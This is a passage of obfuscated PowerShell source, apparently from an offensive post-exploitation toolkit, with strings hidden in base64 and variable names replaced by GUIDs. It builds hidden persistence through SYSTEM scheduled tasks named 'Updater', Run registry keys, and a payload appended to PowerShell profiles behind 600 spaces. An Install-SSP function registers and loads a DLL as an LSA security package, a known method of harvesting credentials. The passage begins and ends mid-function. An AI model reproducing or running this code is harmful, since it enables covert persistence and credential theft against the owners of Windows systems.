            ${516bba0d0e5b4ca4ab825c6a9c4ef241} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YAAiACQAKAAkAEUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdAApAFwAUwB5AHMAdABlAG0AMwAyAFwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAFwAdgAxAC4AMABcAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAC0ATgBvAG4ASQBuAHQAZQByAGEAYwB0AGkAdgBlAGAAIgA=')))
            ${f17dc4af4f9142bfa43c36189ff132e3} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAGgAdABhAHMAawBzACAALwBEAGUAbABlAHQAZQAgAC8AVABOACAAVQBwAGQAYQB0AGUAcgA=')))
            switch (${cc4057f43ec0452aa83a64356d7ea926}.Trigger)
            {
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AEwAbwBnAG8AbgA=')))
                {
                    ${d8effee50a3b401592d3653210566b62} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAGgAdABhAHMAawBzACAALwBDAHIAZQBhAHQAZQAgAC8AUgBVACAAcwB5AHMAdABlAG0AIAAvAFMAQwAgAE8ATgBMAE8ARwBPAE4AIAAvAFQATgAgAFUAcABkAGEAdABlAHIAIAAvAFQAUgAgAA==')))
                }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGkAbAB5AA==')))
                {
                    ${d8effee50a3b401592d3653210566b62} = "schtasks /Create /RU system /SC DAILY /ST $(${cc4057f43ec0452aa83a64356d7ea926}.Time.ToString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABIADoAbQBtADoAcwBzAA=='))))) /TN Updater /TR "
                }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBuAEkAZABsAGUA')))
                {
                    ${d8effee50a3b401592d3653210566b62} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAGgAdABhAHMAawBzACAALwBDAHIAZQBhAHQAZQAgAC8AUgBVACAAcwB5AHMAdABlAG0AIAAvAFMAQwAgAE8ATgBJAEQATABFACAALwBJACAAMQAgAC8AVABOACAAVQBwAGQAYQB0AGUAcgAgAC8AVABSACAA')))
                }
                default
                {
                    throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAGUAbABlAHYAYQB0AGUAZAAgAHAAZQByAHMAaQBzAHQAZQBuAGMAZQAgAG8AcAB0AGkAbwBuAHMAIABwAHIAbwB2AGkAZABlAGQAIQA=')))
                }
            }
            ${d8effee50a3b401592d3653210566b62} = '"' + ${d8effee50a3b401592d3653210566b62} + ${516bba0d0e5b4ca4ab825c6a9c4ef241} + '"'
        }
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGcAaQBzAHQAcgB5AA==')))
        {
            ${d8effee50a3b401592d3653210566b62} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgAEgASwBMAE0AOgBTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABSAHUAbgBcACAALQBOAGEAbQBlACAAVQBwAGQAYQB0AGUAcgAgAC0AUAByAG8AcABlAHIAdAB5AFQAeQBwAGUAIABTAHQAcgBpAG4AZwAgAC0AVgBhAGwAdQBlACAA')))
            ${f17dc4af4f9142bfa43c36189ff132e3} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB2AGUALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgAEgASwBMAE0AOgBTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABSAHUAbgBcACAALQBOAGEAbQBlACAAVQBwAGQAYQB0AGUAcgA=')))
            ${516bba0d0e5b4ca4ab825c6a9c4ef241} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgBgACIAJAAoACQARQBuAHYAOgBTAHkAcwB0AGUAbQBSAG8AbwB0ACkAXABTAHkAcwB0AGUAbQAzADIAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlAGAAIgAgAC0ATgBvAG4ASQBuAHQAZQByAGEAYwB0AGkAdgBlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAiAA==')))
            ${d8effee50a3b401592d3653210566b62} = "'" + ${d8effee50a3b401592d3653210566b62} + ${516bba0d0e5b4ca4ab825c6a9c4ef241} + "'"
        }
        default
        {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAGUAbABlAHYAYQB0AGUAZAAgAHAAZQByAHMAaQBzAHQAZQBuAGMAZQAgAG8AcAB0AGkAbwBuAHMAIABwAHIAbwB2AGkAZABlAGQAIQA=')))
        }
    }
    switch (${df8063b79a7a452ca1a2f7709c4fa2c5}.Method)
    {
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawA=')))
        {
            ${516bba0d0e5b4ca4ab825c6a9c4ef241} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YAAiACQAKAAkAEUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdAApAFwAUwB5AHMAdABlAG0AMwAyAFwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAFwAdgAxAC4AMABcAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAC0ATgBvAG4ASQBuAHQAZQByAGEAYwB0AGkAdgBlAGAAIgA=')))
            ${50dd3889beaf444088a6e13beb8c3d8e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAGgAdABhAHMAawBzACAALwBEAGUAbABlAHQAZQAgAC8AVABOACAAVQBwAGQAYQB0AGUAcgA=')))
            switch (${df8063b79a7a452ca1a2f7709c4fa2c5}.Trigger)
            {
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGkAbAB5AA==')))
                {
                    ${5551831a2227477db4a61598ddf7fbc8} = "schtasks /Create /SC DAILY /ST $(${df8063b79a7a452ca1a2f7709c4fa2c5}.Time.ToString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABIADoAbQBtADoAcwBzAA=='))))) /TN Updater /TR "
                }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBuAEkAZABsAGUA')))
                {
                    ${5551831a2227477db4a61598ddf7fbc8} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBjAGgAdABhAHMAawBzACAALwBDAHIAZQBhAHQAZQAgAC8AUwBDACAATwBOAEkARABMAEUAIAAvAEkAIAAxACAALwBUAE4AIABVAHAAZABhAHQAZQByACAALwBUAFIAIAA=')))
                }
                default
                {
                    throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAHUAcwBlAHIALQBsAGUAdgBlAGwAIABwAGUAcgBzAGkAcwB0AGUAbgBjAGUAIABvAHAAdABpAG8AbgBzACAAcAByAG8AdgBpAGQAZQBkACEA')))
                }
            }
            ${5551831a2227477db4a61598ddf7fbc8} = '"' + ${5551831a2227477db4a61598ddf7fbc8} + ${516bba0d0e5b4ca4ab825c6a9c4ef241} + '"'
        }
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGcAaQBzAHQAcgB5AA==')))
        {
            ${5551831a2227477db4a61598ddf7fbc8} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgAEgASwBDAFUAOgBTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABSAHUAbgBcACAALQBOAGEAbQBlACAAVQBwAGQAYQB0AGUAcgAgAC0AUAByAG8AcABlAHIAdAB5AFQAeQBwAGUAIABTAHQAcgBpAG4AZwAgAC0AVgBhAGwAdQBlACAA')))
            ${50dd3889beaf444088a6e13beb8c3d8e} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB2AGUALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgAEgASwBDAFUAOgBTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABSAHUAbgBcACAALQBOAGEAbQBlACAAVQBwAGQAYQB0AGUAcgA=')))
            ${516bba0d0e5b4ca4ab825c6a9c4ef241} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgBgACIAJAAoACQARQBuAHYAOgBTAHkAcwB0AGUAbQBSAG8AbwB0ACkAXABTAHkAcwB0AGUAbQAzADIAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlAGAAIgAgAC0ATgBvAG4ASQBuAHQAZQByAGEAYwB0AGkAdgBlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAiAA==')))
            ${5551831a2227477db4a61598ddf7fbc8} = "'" + ${5551831a2227477db4a61598ddf7fbc8} + ${516bba0d0e5b4ca4ab825c6a9c4ef241} + "'"
        }
        default
        {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAHUAcwBlAHIALQBsAGUAdgBlAGwAIABwAGUAcgBzAGkAcwB0AGUAbgBjAGUAIABvAHAAdABpAG8AbgBzACAAcAByAG8AdgBpAGQAZQBkACEA')))
        }
    }
${b659b2714f7e4472b30891ae30f5e1b4} = {
function FUNCTIONNAME{
Param([Switch]${ac6e7283283e453eaedd99a83d16eb5a})
$ErrorActionPreference=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
${675e1081ca814260a8f2a0866f0d3c90}={ORIGINALSCRIPT}
if(${ac6e7283283e453eaedd99a83d16eb5a}){
if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgA=')))))
{${81bbd3a50f4d4a3abee6f69f71babbf9}=$PROFILE.AllUsersAllHosts;${2eaa38342e0e4b648d2675d6dba3a304}=ELEVATEDTRIGGER}
else
{${81bbd3a50f4d4a3abee6f69f71babbf9}=$PROFILE.CurrentUserAllHosts;${2eaa38342e0e4b648d2675d6dba3a304}=USERTRIGGER}
md (Split-Path -Parent ${81bbd3a50f4d4a3abee6f69f71babbf9})
(gc ${81bbd3a50f4d4a3abee6f69f71babbf9}) + (' ' * 600 + ${675e1081ca814260a8f2a0866f0d3c90})|Out-File ${81bbd3a50f4d4a3abee6f69f71babbf9} -Fo
iex ${2eaa38342e0e4b648d2675d6dba3a304}|Out-Null
echo ${2eaa38342e0e4b648d2675d6dba3a304}}
else
{${675e1081ca814260a8f2a0866f0d3c90}.Invoke()}
} EXECUTEFUNCTION
}
    ${b659b2714f7e4472b30891ae30f5e1b4} = ${b659b2714f7e4472b30891ae30f5e1b4}.ToString().Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBVAE4AQwBUAEkATwBOAE4AQQBNAEUA'))), ${e1647abadf884b208ff363b3ef33e4b0})
    ${b659b2714f7e4472b30891ae30f5e1b4} = ${b659b2714f7e4472b30891ae30f5e1b4}.ToString().Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBSAEkARwBJAE4AQQBMAFMAQwBSAEkAUABUAA=='))), ${bdde8df95b13416abc69e7f89b90b98e})
    ${b659b2714f7e4472b30891ae30f5e1b4} = ${b659b2714f7e4472b30891ae30f5e1b4}.ToString().Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBMAEUAVgBBAFQARQBEAFQAUgBJAEcARwBFAFIA'))), ${d8effee50a3b401592d3653210566b62})
    ${b659b2714f7e4472b30891ae30f5e1b4} = ${b659b2714f7e4472b30891ae30f5e1b4}.ToString().Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBTAEUAUgBUAFIASQBHAEcARQBSAA=='))), ${5551831a2227477db4a61598ddf7fbc8})
    if (${cf9bd0c2aaee4219940dc2dd6ab44219})
    {
        ${b659b2714f7e4472b30891ae30f5e1b4} = ${b659b2714f7e4472b30891ae30f5e1b4}.ToString().Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwBVAFQARQBGAFUATgBDAFQASQBPAE4A'))), '')
    }
    else
    {
        ${b659b2714f7e4472b30891ae30f5e1b4} = ${b659b2714f7e4472b30891ae30f5e1b4}.ToString().Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAQwBVAFQARQBGAFUATgBDAFQASQBPAE4A'))), "${e1647abadf884b208ff363b3ef33e4b0} -Persist")
    }
${95f2db71f337426492d85e9665344ad3} = @"
# Execute the following to remove the elevated persistent payload
${f17dc4af4f9142bfa43c36189ff132e3}
# Execute the following to remove the user-level persistent payload
${50dd3889beaf444088a6e13beb8c3d8e}
"@
    ${b659b2714f7e4472b30891ae30f5e1b4} | Out-File ${966f141aaef74dcaab3ffcd81c15f7b8}
    Write-Verbose "Persistence script written to ${966f141aaef74dcaab3ffcd81c15f7b8}"
    ${95f2db71f337426492d85e9665344ad3} | Out-File ${188aaa68b84a471c8bc115bfaea60abf}
    Write-Verbose "Persistence removal script written to ${188aaa68b84a471c8bc115bfaea60abf}"
    if (${a9f05a6260d64d84befdddce7da6437b})
    {
        echo ([ScriptBlock]::Create(${b659b2714f7e4472b30891ae30f5e1b4}))
    }
}
function Install-SSP
{
    [CmdletBinding()] Param (
        [ValidateScript({Test-Path (rvpa $_)})]
        [String]
        ${c64edf13e2624028966218a15073390b}
    )
    ${fd8b9b45f19c4400a8fb9de41f05526c} = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    if(-not ${fd8b9b45f19c4400a8fb9de41f05526c}.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAGwAbABpAG4AZwAgAGEAbgAgAFMAUwBQACAAZABsAGwAIAByAGUAcQB1AGkAcgBlAHMAIABhAGQAbQBpAG4AaQBzAHQAcgBhAHQAaQB2AGUAIAByAGkAZwBoAHQAcwAuACAARQB4AGUAYwB1AHQAZQAgAHQAaABpAHMAIABzAGMAcgBpAHAAdAAgAGYAcgBvAG0AIABhAG4AIABlAGwAZQB2AGEAdABlAGQAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcAByAG8AbQBwAHQALgA=')))
    }
    ${c8a8ed288c9549119b34c598f0cedab7} = rvpa ${c64edf13e2624028966218a15073390b}
    function local:Get-PEArchitecture
    {
        Param
        (
            [Parameter( Position = 0,
                        Mandatory = $True )]
            [String]
            ${c64edf13e2624028966218a15073390b}
        )
        ${e031c7ef3ee1487c89e804262dd8bb1c} = New-Object System.IO.FileStream(${c64edf13e2624028966218a15073390b}, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
        [Byte[]] $MZHeader = New-Object Byte[](2)
        ${e031c7ef3ee1487c89e804262dd8bb1c}.Read($MZHeader,0,2) | Out-Null
        ${9a1deaf82de949cb85c843016bdc8031} = [System.Text.AsciiEncoding]::ASCII.GetString($MZHeader)
        if (${9a1deaf82de949cb85c843016bdc8031} -ne 'MZ')
        {
            ${e031c7ef3ee1487c89e804262dd8bb1c}.Close()
            Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAFAARQAgAGgAZQBhAGQAZQByAC4A')))
        }
        ${e031c7ef3ee1487c89e804262dd8bb1c}.Seek(0x3c, [System.IO.SeekOrigin]::Begin) | Out-Null
        [Byte[]] $lfanew = New-Object Byte[](4)
        ${e031c7ef3ee1487c89e804262dd8bb1c}.Read($lfanew,0,4) | Out-Null
        ${fe0f917046bf4d9d8a06ef630810cce7} = [Int] ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAB9AA=='))) -f (( $lfanew[-1..-4] | % { $_.ToString('X2') } ) -join ''))
        ${e031c7ef3ee1487c89e804262dd8bb1c}.Seek(${fe0f917046bf4d9d8a06ef630810cce7} + 4, [System.IO.SeekOrigin]::Begin) | Out-Null
        [Byte[]] $IMAGE_FILE_MACHINE = New-Object Byte[](2)
        ${e031c7ef3ee1487c89e804262dd8bb1c}.Read($IMAGE_FILE_MACHINE,0,2) | Out-Null
        ${d3ada9716a024ec4bbd18db5b49df90b} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwAH0A'))) -f (( $IMAGE_FILE_MACHINE[-1..-2] | % { $_.ToString('X2') } ) -join '')
        ${e031c7ef3ee1487c89e804262dd8bb1c}.Close()
        if ((${d3ada9716a024ec4bbd18db5b49df90b} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAxADQAQwA=')))) -and (${d3ada9716a024ec4bbd18db5b49df90b} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAA2ADYANAA=')))))
        {
            Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAFAARQAgAGgAZQBhAGQAZQByACAAbwByACAAdQBuAHMAdQBwAHAAbwByAHQAZQBkACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUALgA=')))
        }
        if (${d3ada9716a024ec4bbd18db5b49df90b} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAxADQAQwA='))))
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MwAyAC0AYgBpAHQA')))
        }
        elseif (${d3ada9716a024ec4bbd18db5b49df90b} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAA2ADYANAA='))))
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NgA0AC0AYgBpAHQA')))
        }
        else
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB0AGgAZQByAA==')))
        }
    }
    ${5fd231bc1f04486897e6d6d3dac6a263} = Get-PEArchitecture ${c8a8ed288c9549119b34c598f0cedab7}
    ${7b947702b5f14f0795519fe23e777f55} = gwmi Win32_OperatingSystem | select -ExpandProperty OSArchitecture
    if (${5fd231bc1f04486897e6d6d3dac6a263} -ne ${7b947702b5f14f0795519fe23e777f55})
    {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABvAHAAZQByAGEAdABpAG4AZwAgAHMAeQBzAHQAZQBtACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIABtAHUAcwB0ACAAbQBhAHQAYwBoACAAdABoAGUAIABhAHIAYwBoAGkAdABlAGMAdAB1AHIAZQAgAG8AZgAgAHQAaABlACAAUwBTAFAAIABkAGwAbAAuAA==')))
    }
    ${7224f83d7191419f8213c7d4de3ebbf9} = gi ${c8a8ed288c9549119b34c598f0cedab7} | select -ExpandProperty Name
    ${068421be1fce4376800328fbc5a28b89} = ${7224f83d7191419f8213c7d4de3ebbf9} | % { % {($_ -split '\.')[0]} }
    ${607878ccac164886b2b4e23fcca9041a} = gp HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5ACAAUABhAGMAawBhAGcAZQBzAA=='))) |
        select -ExpandProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5ACAAUABhAGMAawBhAGcAZQBzAA==')))
    if (${607878ccac164886b2b4e23fcca9041a} -contains ${068421be1fce4376800328fbc5a28b89})
    {
        throw "'${068421be1fce4376800328fbc5a28b89}' is already present in HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages."
    }
    ${106879f3248c4eba9f57aa44fbcd5ccc} = "$($Env:windir)\Sysnative"
    if (Test-Path ${106879f3248c4eba9f57aa44fbcd5ccc})
    {
        ${0449ce4ae41c4c05b87128b87d60478f} = ${106879f3248c4eba9f57aa44fbcd5ccc}
    }
    else
    {
        ${0449ce4ae41c4c05b87128b87d60478f} = "$($Env:windir)\System32"
    }
    if (Test-Path (Join-Path ${0449ce4ae41c4c05b87128b87d60478f} ${7224f83d7191419f8213c7d4de3ebbf9}))
    {
        throw "${7224f83d7191419f8213c7d4de3ebbf9} is already installed in ${0449ce4ae41c4c05b87128b87d60478f}."
    }
    cp ${c8a8ed288c9549119b34c598f0cedab7} ${0449ce4ae41c4c05b87128b87d60478f}
    ${607878ccac164886b2b4e23fcca9041a} += ${068421be1fce4376800328fbc5a28b89}
    sp HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5ACAAUABhAGMAawBhAGcAZQBzAA=='))) -Value ${607878ccac164886b2b4e23fcca9041a}
    ${1f8ecc981fbb4e47ba061a53044a707d} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBTAFAASQAyAA=='))))
    ${fe4d7ca4026e47f3b620ed1e74c0e37a} = [AppDomain]::CurrentDomain.DefineDynamicAssembly(${1f8ecc981fbb4e47ba061a53044a707d}, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    ${ac678682e4f149bfafb1b16e8d88c398} = ${fe4d7ca4026e47f3b620ed1e74c0e37a}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBTAFAASQAyAA=='))), $False)
    ${45b97198ae354124831731ef24c92007} = ${ac678682e4f149bfafb1b16e8d88c398}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBTAFAASQAyAC4AUwBlAGMAdQByADMAMgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEMAbABhAHMAcwA='))))
    ${3a0d90aa783842659ba2918c88428ef3} = ${45b97198ae354124831731ef24c92007}.DefinePInvokeMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAUwBlAGMAdQByAGkAdAB5AFAAYQBjAGsAYQBnAGUA'))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGMAdQByADMAMgAuAGQAbABsAA=='))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
        [Reflection.CallingConventions]::Standard,
        [Int32],
        [Type[]] @([String], [IntPtr]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Auto)
    ${036a3cc75ce04b6e8c8f0f3f43bb1521} = ${45b97198ae354124831731ef24c92007}.CreateType()
    if ([IntPtr]::Size -eq 4) {
        ${1c87c8c7352b45ff98e9ead84daaa574} = 20
    } else {
        ${1c87c8c7352b45ff98e9ead84daaa574} = 24
    }
    ${8e8f00cc1f994a95a799c9c24396a2e4} = [Runtime.InteropServices.Marshal]::AllocHGlobal(${1c87c8c7352b45ff98e9ead84daaa574})
    [Runtime.InteropServices.Marshal]::WriteInt32(${8e8f00cc1f994a95a799c9c24396a2e4}, ${1c87c8c7352b45ff98e9ead84daaa574})
    ${fc9779339f7f411196a703cc7b137b81} = $True
    try {
        ${8d8d49797b5b494095bad3098d94ec73} = ${036a3cc75ce04b6e8c8f0f3f43bb1521}::AddSecurityPackage(${068421be1fce4376800328fbc5a28b89}, ${8e8f00cc1f994a95a799c9c24396a2e4})
    } catch {
        ${4e989fb8ffc14376960d82cc58c5fd3b} = $Error[0].Exception.InnerException.HResult
        Write-Warning "Runtime loading of the SSP failed. (0x$(${4e989fb8ffc14376960d82cc58c5fd3b}.ToString('X8')))"
        Write-Warning "Reason: $(([ComponentModel.Win32Exception] ${4e989fb8ffc14376960d82cc58c5fd3b}).Message)"
        ${fc9779339f7f411196a703cc7b137b81} = $False
    }
    if (${fc9779339f7f411196a703cc7b137b81}) {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAGwAbABhAHQAaQBvAG4AIABhAG4AZAAgAGwAbwBhAGQAaQBuAGcAIABjAG8AbQBwAGwAZQB0AGUAIQA=')))
    } else {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAGwAbABhAHQAaQBvAG4AIABjAG8AbQBwAGwAZQB0AGUAIQAgAFIAZQBiAG8AbwB0ACAAZgBvAHIAIABjAGgAYQBuAGcAZQBzACAAdABvACAAdABhAGsAZQAgAGUAZgBmAGUAYwB0AC4A')))
    }
}
function Get-SecurityPackages
{
    [CmdletBinding()] Param()
    ${1f8ecc981fbb4e47ba061a53044a707d} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBTAFAASQA='))))
    ${fe4d7ca4026e47f3b620ed1e74c0e37a} = [AppDomain]::CurrentDomain.DefineDynamicAssembly(${1f8ecc981fbb4e47ba061a53044a707d}, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    ${ac678682e4f149bfafb1b16e8d88c398} = ${fe4d7ca4026e47f3b620ed1e74c0e37a}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBTAFAASQA='))), $False)
    ${1897ccfb3dd24fdda7662936eb2b8060} = [FlagsAttribute].GetConstructor(@())
    ${dae4b3ac19a04fdbad9eed698a036e31} = New-Object Reflection.Emit.CustomAttributeBuilder(${1897ccfb3dd24fdda7662936eb2b8060}, @())
    ${2a6b61d5404b4a36899cdae620046f62} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    ${d09bb55ff972413ead29f35f8a7f48b0} = ${ac678682e4f149bfafb1b16e8d88c398}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBTAFAASQAuAFMARQBDAFAASwBHAF8ARgBMAEEARwA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [Int32])
    ${d09bb55ff972413ead29f35f8a7f48b0}.SetCustomAttribute(${dae4b3ac19a04fdbad9eed698a036e31})
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBOAFQARQBHAFIASQBUAFkA'))), 1)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAEkAVgBBAEMAWQA='))), 2)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8ATwBOAEwAWQA='))), 4)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABBAFQAQQBHAFIAQQBNAA=='))), 8)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBPAE4ATgBFAEMAVABJAE8ATgA='))), 0x10)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBVAEwAVABJAF8AUgBFAFEAVQBJAFIARQBEAA=='))), 0x20)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAEkARQBOAFQAXwBPAE4ATABZAA=='))), 0x40)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAFQARQBOAEQARQBEAF8ARQBSAFIATwBSAA=='))), 0x80)
    $null = ${d09bb55ff972413ead29f35f8a7f48b0}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAFAARQBSAFMATwBOAEEAVABJAE8ATgA='))), 0x100)
